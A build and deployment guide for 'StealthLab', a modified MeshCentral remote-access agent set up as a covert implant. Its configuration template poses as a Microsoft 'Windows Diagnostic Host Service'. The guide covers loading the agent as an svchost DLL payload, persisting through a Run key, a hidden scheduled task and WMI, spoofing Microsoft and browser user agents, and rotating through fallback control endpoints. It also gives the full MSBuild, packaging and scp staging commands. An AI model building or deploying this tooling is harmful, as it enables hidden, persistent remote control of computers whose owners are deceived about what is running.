# MeshAgent Custom Build & Deployment Guide

This guide describes the current, fully automated workflow for producing StealthLab-ready binaries and deploying them to your MeshCentral instance.

> **Use hostnames, not bare IPs.** Keep the MeshCentral URLs (`agents.high.support`, `relay.high.support`, etc.) in both your local `branding_config.local.json` and the MeshCentral portal so the TLS pins remain valid.

---

## Overview

The local build pipeline now handles every step end-to-end:

- `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal` generates branding headers and provisioning assets, builds the StealthLab DLL, refreshes `meshservice\embedded\svchost_payload.dll`, and then builds the StealthLab outputs.
- The same build emits:
  - `meshservice\x64\StealthLab\MeshService-2022.exe`
  - `meshservice\StealthLab\MeshService-2022.exe`
- `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`
- `meshconsole\Release\MeshConsole64.exe`
- StealthLab defaults are enforced; when you must exercise a non-StealthLab build (for example, a legacy Release regression), invoke MSBuild directly using the commands in *Manual Release Regression* below.
- Packaging and MeshCentral staging are now explicit copy/sign steps driven from those build outputs rather than PowerShell build wrappers.

GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.

---

## Prerequisites

- Windows 10/11 build workstation.
- Visual Studio 2022 with the following workloads:
  - Desktop development with C++
  - MSVC v143 toolset
  - Windows 10/11 SDK
- PowerShell 7+ (pwsh) recommended; Windows PowerShell 5.1 supported.
- Python 3.10+ on the PATH (used by helper scripts).
- Git submodules initialised:  `git submodule update --init --recursive`
- `branding_config.local.json` populated with your production values (see the updated template later in this document). The tracked `branding_config.json` now contains only placeholders.
- Optional preflight before building:
  ```powershell
  python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json
  ```
  This validates the branding JSON while regenerating `meshcore\generated\meshagent_branding.h` and `WinDiagnosticHost.msh`. The MSBuild path also performs this generation automatically.

---

## Build Workflow (Recommended)

1. Open *Developer PowerShell for VS 2022* (or any PowerShell session with VS build tools available) and change to the repository root:
   ```powershell
   cd C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent
   ```
2. (Optional) Pull the latest changes:
   ```powershell
   git pull
   ```
3. Launch the StealthLab build:
   ```powershell
   MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
   ```
   The build will:
   - Regenerate `meshagent_branding.h`, `WinDiagnosticHost.msh`, and the generated network profile from `branding_config.local.json` (preferred) or `branding_config.json`.
   - Rebuild `MeshService-2022.dll` under `meshservice\x64\StealthLab_DLL`.
   - Copy that DLL into `meshservice\embedded\svchost_payload.dll` (no manual staging required).
   - Emit StealthLab executables for x64 and Win32 plus the x64 MeshConsole build.
4. Run the fast regression harness to confirm branding, payload, and resource checks:
   ```powershell
   pwsh .\test.ps1 -ReportPath .\dist\verify-report.json
   ```
   Expect warnings for unsigned binaries until you apply Authenticode signatures. Any failures must be resolved before packaging.
5. (Optional) Build individual variants directly when you only need one output:
   ```powershell
    MSBuild.exe .\meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m /nologo
    MSBuild.exe .\MeshAgent-2022.sln /p:Configuration=StealthLab /p:Platform=x64 /m /nologo
    MSBuild.exe .\meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=Win32 /m /nologo
    ```
   The supported full-package path remains `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal`. Direct `StealthLab|x64` project builds now force the `StealthLab_DLL|x64` prerequisite first, but you should still avoid running separate x64 DLL and x64 EXE builds in parallel against the same checkout.

Verify the payload was staged correctly:
```powershell
Get-FileHash meshservice\x64\StealthLab_DLL\MeshService-2022.dll
Get-FileHash meshservice\embedded\svchost_payload.dll
# Hashes should match
```

---

## Packaging Options

### 1. Generate a Drop-In Package (Recommended)

```powershell
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$bundle = Join-Path 'dist' "MeshAgent_Stealth_$stamp"
New-Item -ItemType Directory -Path $bundle, (Join-Path $bundle 'verification') -Force | Out-Null
Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService64.exe') -Force
Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService.exe') -Force
Copy-Item 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' (Join-Path $bundle 'diagsvc.dll') -Force
Copy-Item 'WinDiagnosticHost.msh' (Join-Path $bundle 'WinDiagnosticHost.msh') -Force
pwsh .\test.ps1 -ReportPath (Join-Path $bundle 'verification\verify-report.json')
```

This produces a timestamped bundle under `dist\\MeshAgent_Stealth_<stamp>\\` using the already-built StealthLab outputs. Add `pwsh .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath <bundle>\verification\health_report.json` when you need a post-install health probe.

Each bundle contains:

- `diagsvc.dll` – svchost payload ready for deployment.
- `MeshService64.exe` / `MeshService.exe` – binaries for direct service overrides.
- `verification\\` – regression output (`verify-log.txt`, `verify-report.json`) plus `health_report.json` when `-RunHealthCheck` is supplied.
- `checksums.txt` / release notes you generate from the copied files.
- `README.txt` or deployment instructions for the target environment.

> **Health check tip:** the probe can only verify the installed service when it knows the install path. Point `tools\health_check.ps1` at `C:\ProgramData\DiagnosticHost` (or your deployment path) when you need a fully green report.

### Package Verification

After packaging, review the generated `verification\\` folder or rerun the suites manually:

```powershell
pwsh .\test.ps1 -BinaryPath .\dist\MeshAgent_Stealth_YYYYMMDD_HHMMSS
# Optional release regression (targets meshservice\Release\*.exe)
pwsh .\test_comprehensive.ps1
```

`test.ps1` checks branding JSON/schema compliance, embedded service/display names, Mesh/Server IDs, metadata versioning, and optional signer allow-list entries. Warnings about missing Authenticode signatures are expected until you sign the binaries. Failures indicate a mismatch between your branding configuration and the compiled artefacts.

### 2. Manual Artifact Pickup

If you need individual files without creating a bundle:

| Artifact | Location |
|----------|----------|
| StealthLab DLL payload | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` |
| Bundled resource copy  | `meshservice\embedded\svchost_payload.dll` |
| StealthLab x64 EXE     | `meshservice\x64\StealthLab\MeshService-2022.exe` |
| StealthLab Win32 EXE   | `meshservice\StealthLab\MeshService-2022.exe` |

To create a `diagsvc.dll` manually:
```powershell
Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
```

### 3. Manual Release Regression
When you need clean `meshservice\Release` outputs (for example to run `test_comprehensive.ps1` or attach legacy artefacts to a GitHub release), build directly with MSBuild:

```powershell
$msbuild = "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
& $msbuild MeshAgent-2022.sln /p:Configuration=Release /p:Platform=x64 /m /nologo
& $msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=Win32 /m /nologo
pwsh .\test_comprehensive.ps1
```

This produces `Release\MeshService64.exe` plus `meshservice\Release\MeshService.exe`. Use `out\deliverables\MeshAgent-<yyyy-mm-dd>\` to stage hashes, metadata, and ZIP archives (see *Transfer Package Generation* below).

### 4. MeshCentral override bundle

To stage files exactly as MeshCentral expects:

```powershell
$handoff = 'dist\meshcentral'
$agents = Join-Path $handoff 'meshcentral-data\agents'
$signed = Join-Path $handoff 'meshcentral-data\signedagents'
New-Item -ItemType Directory -Path $agents, $signed -Force | Out-Null
Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $agents 'MeshService64.exe') -Force
Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $agents 'MeshService.exe') -Force
Copy-Item 'WinDiagnosticHost.msh' (Join-Path $agents 'WinDiagnosticHost.msh') -Force
Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $signed 'MeshService64.exe') -Force
Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $signed 'MeshService.exe') -Force
Copy-Item 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' (Join-Path $handoff 'diagsvc.dll') -Force
```

This produces `dist\meshcentral\` with the agent-serving binaries under `meshcentral-data\agents\`, optional pre-signed slots under `meshcentral-data\signedagents\`, and `diagsvc.dll` for svchost deployments.

### 5. Transfer Package Generation
Run the snippet below whenever you need to hand off a ZIP with metadata and hashes (for GitHub releases or offline transfer):

```powershell
$date = Get-Date -Format 'yyyy-MM-dd'
$root = Join-Path $PSScriptRoot "out\deliverables\MeshAgent-$date"
New-Item -ItemType Directory -Path (Join-Path $root 'bin'), (Join-Path $root 'pdb') -Force | Out-Null
Copy-Item -Path '.\Release\MeshService64.exe','.\meshservice\Release\MeshService.exe' -Destination (Join-Path $root 'bin') -Force
Copy-Item -Path '.\Release\MeshService64.pdb','.\meshservice\Release\MeshService.pdb' -Destination (Join-Path $root 'pdb') -Force
Get-ChildItem (Join-Path $root 'bin') | ForEach-Object {
    $hash = Get-FileHash $_ -Algorithm SHA256
    '{0}  SHA256  {1}' -f $_.Name, $hash.Hash.ToLower()
} | Set-Content -Path (Join-Path $root 'hashes.txt') -Encoding ASCII
$commit = (git rev-parse HEAD).Trim()
$branch = (git rev-parse --abbrev-ref HEAD).Trim()
$vswhere = 'C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe'
$vs = if (Test-Path $vswhere) { (& $vswhere -latest -requires Microsoft.Component.MSBuild -property catalog_productDisplayVersion).Trim() } else { 'unknown' }
$sdkLib = 'C:\Program Files (x86)\Windows Kits\10\Lib'
$sdk = if (Test-Path $sdkLib) { (Get-ChildItem $sdkLib | Where-Object PSIsContainer | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name) } else { 'unknown' }
@(
    "Commit: $commit"
    "Branch: $branch"
    "Build date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss K')"
    "Visual Studio: $vs"
    "Windows SDK: $sdk"
    "Build matrix:"
    "  - MeshAgent-2022.sln / Release|x64"
    "  - meshservice\MeshService-2022.vcxproj / Release|Win32"
    "Warnings: C4996 (sprintf/sscanf), C4013 (Stealth_DebugPrintfW); no errors."
) | Set-Content -Path (Join-Path $root 'metadata.txt') -Encoding UTF8
$zip = Join-Path 'out\deliverables' ("MeshAgent-$date-win.zip")
if (Test-Path $zip) { Remove-Item $zip -Force }
Compress-Archive -Path (Join-Path $root '*') -DestinationPath $zip -Force
```

Deliverable contents:

- `bin\MeshService64.exe`, `bin\MeshService.exe`
- `pdb\MeshService64.pdb`, `pdb\MeshService.pdb` (optional for archival)
- `hashes.txt` (SHA256 list)
- `metadata.txt` (commit/branch, toolchain versions, build matrix, warnings)
- `MeshAgent-YYYY-MM-DD-win.zip` ready to upload to GitHub Releases or share securely.
- Upload  `MeshAgent-YYYY-MM-DD-win.zip` (plus `hashes.txt` / `metadata.txt` if desired) to GitHub Releases or attach it to the secure transfer channel used for deployment approvals. 

---

## Deploy to MeshCentral

1. **Stage locally.** When the MeshCentral data folder sits beside the MeshAgent repo (default dev rig), run:
   ```powershell
   Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' '..\meshcentral-data\agents\MeshService64.exe' -Force
   Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' '..\meshcentral-data\agents\MeshService.exe' -Force
   Copy-Item 'WinDiagnosticHost.msh' '..\meshcentral-data\agents\WinDiagnosticHost.msh' -Force
   ```
   If you are serving pre-signed binaries, mirror the same executables into `..\meshcentral-data\signedagents\`.
2. **Stage remotely when needed.** Copy the same files to `/opt/meshcentral/meshcentral-data/agents/` on the target server:
   ```powershell
   scp meshservice\x64\StealthLab\MeshService-2022.exe deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService64.exe
   scp meshservice\StealthLab\MeshService-2022.exe deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService.exe
   scp WinDiagnosticHost.msh deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService-2022.msh
   ```
   Adjust hostnames and credentials as required; the key point is to avoid the deprecated `agents-custom/` directory entirely.
3. **Restart MeshCentral / flush cache.** Either restart the service (`sudo systemctl restart meshcentral` on Linux) or allow `tools\Invoke-RuntimeValidation.ps1` to do it for you (it stops any local `node meshcentral.js` processes, restarts them, and deletes cached diaghost downloads).
4. **Prove download parity.** Always run:
   ```powershell
   pwsh .\tools\Invoke-RuntimeValidation.ps1 `
        -MeshCentralRepo '..\MeshCentral' `
        -BinaryPath 'meshservice\x64\StealthLab' `
        -ReportPath 'verification\phase3\runtime.json' `
        -LogPath 'verification\phase3\runtime.log'
   ```
   The helper restages MeshCentral if needed, downloads a fresh agent via `meshctrl`, installs/uninstalls via svchost, and fails if the server serves the wrong binary or if the service type deviates from `SERVICE_WIN32_SHARE_PROCESS`.
5. **Manual spot-check (optional).** Download the Windows x64 agent from the portal (or via `meshctrl AgentDownload --type 4`) and confirm the SHA256 matches `meshservice\x64\StealthLab\MeshService-2022.exe`. Compare against `dist\...\hashes.txt` to make sure the embedded svchost payload is identical.

---

## Post-Deployment Checks

- Confirm the staged payload on disk matches the StealthLab DLL:
  ```powershell
  Get-FileHash "C:\\ProgramData\\DiagnosticHost\diagsvc.dll"
  ```
- Run the included verifier to ensure branding, TLS profile, and provisioning data match expectations:
  ```powershell
  .\tools\verify_deployment.ps1 -Server agents.high.support
  ```
- Capture a post-install snapshot:
  ```powershell
  .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath .\dist\post-deploy-health.json
  ```
- Use `tools\uninstall.ps1` and `tools\rollback_update.ps1` when you need reversible rollouts (see quick checklist under `docs/files/meshagent_release_checklist.md`).
- Enrol a test endpoint with the newly published agent and inspect the MeshCentral console for a successful check-in.

---

## Optional: GitHub Actions Automation

The workflow in `.github/workflows/build-release.yml` still functions, and it now relies on the same generated-assets step plus direct `MSBuild` invocations documented above. When enabling the workflow:

- Provide `SSH_PRIVATE_KEY` if you want the pipeline to deploy automatically (same key used for manual `scp`).
- Update `BRANDING_CONFIG_JSON` to match the refreshed schema (see next section).
- Expect the artifacts to be named `MeshService-2022.exe` instead of the legacy `MeshService64.exe`.

The GitHub workflow and local builds both regenerate branding assets before compiling, so the staged DLL and provisioning manifest stay in sync without wrapper scripts.

### MinGW Build Notes
For cross-compiling with MinGW-w64 (e.g., on MSYS2):

- Install toolchains: `pacman -S mingw-w64-x86_64-gcc mingw-w64-i686-gcc mingw-w64-x86_64-osslsigncode`. `strings` ships via `binutils` (`pacman -S binutils`).
- Run the helper:
  ```bash
  ./build-windows-mingw.sh
  ```
  The script now logs validation output to `build/mingw/build-mingw.log` (service/display names, Mesh ID, Server ID). Review the log for any `[WARN]` entries.
- Signed builds: if the binaries are unsigned, `osslsigncode verify` will emit warnings—this is expected for local test builds.
- Troubleshooting tips:
  | Warning | Action |
  |---------|--------|
  | `strings` not available | Install GNU binutils within MSYS2 (`pacman -S binutils`). |
| Mesh/Server ID missing in log | Re-run `python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json` before building; confirm `branding_config.local.json` values. |
  | `osslsigncode verify` failure | Sign the binaries (or disable the check) prior to distribution; local unsigned builds may skip this step. |

---

## Troubleshooting Quick Reference

| Symptom | Checks |
|---------|--------|
| `svchost_payload.dll` not updated | Re-run `MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
| MeshCentral still serving old agent | Confirm upload path, restart MeshCentral, and clear CDN/cache if fronted by a proxy. |
| Agent fails to enrol | Ensure `branding_config.local.json` `provisioning.serverUrl` matches the domain you uploaded to, and that the server certificate hash is current. |
| Build script exits early | Check that Visual Studio 2022 MSBuild is installed and available at `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`. |
| Health check reports missing binaries | Re-run `pwsh .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath .\dist\post-deploy-health.json` after installing to `C:\ProgramData\DiagnosticHost` (or your deployment path). |

---

## Updated Configuration Template

The companion `branding_config.template.json` now mirrors every field consumed by the build scripts. Duplicate it to `branding_config.local.json` (git-ignored) and replace the placeholder values:

```jsonc
{
  "$schema": "./schema/meshagent.schema.json",
  "branding": {
    "companyName": "Microsoft Corporation",
    "serviceName": "WinDiagnosticHost",
    "displayName": "Windows Diagnostic Host Service",
    "binaryName": "diaghost.exe",
    "productName": "Windows Diagnostic Host",
    "description": "system health monitoring",
    "installRoot": "C:/ProgramData/DiagnosticHost",
    "logPath": "C:/ProgramData/DiagnosticHost/logs"
  },
  "network": {
    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
    "userAgent": "Microsoft-CryptoAPI/10.0",
    "alpn": ["http/1.1"],
    "retryAttempts": 5,
    "retryDelay": 10
  },
  "stealth": {
    "enabled": true,
    "svchostMode": true,
    "bundleExtract": true
  },
  "persistence": {
    "runKey": true,
    "scheduledTask": { "enabled": true, "hidden": true },
    "wmi": { "enabled": true }
  },
  "provisioning": {
    "meshName": "Windows Diagnostics",
    "meshType": "2",
    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
    "serverId": "YOUR_SERVER_CERT_HASH",
    "meshId": "YOUR_MESH_ID"
  }
}

> When `stealth.svchostMode` is enabled the build pipeline now forces `stealth.bundleExtract` on so the svchost DLL payload is dropped and registered automatically during installation.
```

### Network Profile Examples

MeshAgent now supports both fully static and MeshCentral-assigned (dynamic) control channels. Pick the profile that matches your deployment strategy and update `branding_config.local.json` before running the packaging pipeline.

| Profile | When to use it | Sample snippet |
| --- | --- | --- |
| **Static (curated hosts + fallbacks)** | You control the front door endpoints and want the agent to rotate through a pre-defined list if MeshCentral metadata is missing. | ```jsonc\n\"network\": {\n  \"primaryEndpoint\": \"wss://agents.high.support:4445/agent.ashx\",\n  \"fallbackEndpoints\": [\n    { \"url\": \"wss://agents.high.support:4446/agent.ashx\", \"sni\": \"agents.high.support\", \"hostHeader\": \"agents.high.support\", \"alpn\": [\"http/1.1\"] },\n    { \"url\": \"wss://agents-dr.high.support:4445/agent.ashx\", \"sni\": \"agents-dr.high.support\", \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\" },\n    { \"url\": \"wss://198.51.100.45:443/agent.ashx\", \"hostHeader\": \"agents.high.support\", \"sni\": \"agents.high.support\" }\n  ],\n  \"userAgent\": \"Microsoft-CryptoAPI/10.0\",\n  \"alpn\": [\"http/1.1\"],\n  \"retryAttempts\": 5,\n  \"retryDelay\": 10\n}\n``` |
| **Dynamic (MeshCentral assigns URLs and ports)** | You want MeshCentral to publish control-channel metadata on demand (e.g., per tenant/device group). Branding leaves the endpoint blank and the agent waits for `.msh` provisioning data. | ```jsonc\n\"network\": {\n  \"dynamic\": true,\n  \"userAgent\": \"Microsoft-CryptoAPI/10.0\"\n}\n``` |
| **Hybrid (static defaults + MeshCentral override)** | Keep static fallbacks but allow MeshCentral to override the primary via the downloaded `.msh`. | ```jsonc\n\"network\": {\n  \"primaryEndpoint\": \"wss://agents.example.net:443/agent.ashx\",\n  \"dynamic\": true,\n  \"fallbackEndpoints\": [\n    { \"url\": \"wss://198.51.100.10:443/agent.ashx\", \"sni\": \"agents.example.net\" }\n  ]\n}\n``` |

**Port reference:** Make sure outbound TCP is permitted to every host/port pair you advertise. The default StealthLab profile uses `agents.high.support:4445`, `agents.high.support:4446`, `agents-dr.high.support:4445`, and `198.51.100.45:443`. Update the allowlist whenever you change the branding JSON so runtime validation does not fail on blocked egress.

> **MeshCentral staging tip:** Whenever you enable `network.dynamic`, regenerate provisioning assets with `python .\tools\generate_branding_assets.py --repo-root . --config .\branding_config.local.json` (or by rebuilding through `MeshAgent.Build.proj`) so the compiled header carries `NULL` endpoints and MeshCentral can supply the active URL via `WinDiagnosticHost.msh`.

Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.

---

### Current StealthLab Build Snapshot (2025-10-27)

| Artifact | Path | SHA256 | Notes |
| --- | --- | --- | --- |
| x64 svchost payload DLL | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` | `60B7FA17A906E6C921197D87D957DC99730228E4001D84CDC5F2312F557E650F` | Embedded via `meshcore\embedded\generated\svchost_payload.h` |
| x64 service wrapper | `meshservice\x64\StealthLab\MeshService-2022.exe` | `18284E2EDC3520F90AE4CF91E41DC35CA336D44DC2F3750AD77F22EA49C16427` | Staged to `meshcentral-data\agents\MeshService64.exe` |
| Win32 service wrapper | `meshservice\StealthLab\MeshService-2022.exe` | `D04A088EA0AF73D8B4DBB7DE917C37C80E4D4F8BDB20137BFA44394C9E630B7E` | Staged to `meshcentral-data\agents\MeshService.exe` |
| Provisioning manifest | `meshservice\x64\StealthLab\MeshService-2022.msh` | `4ACEB797EEC7AD1772786B8EC1B87F327BD25DAEE60A4E666ABBF614345F4812` | Dynamic endpoints—MeshCentral overrides at download |

These files were staged by copying the current StealthLab outputs into `..\MeshCentral\meshcentral-data\agents\` (and optionally `..\MeshCentral\meshcentral-data\signedagents\` for pre-signed executables). Restart MeshCentral (or let it auto-reload) so portal downloads serve the refreshed binaries.

Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.









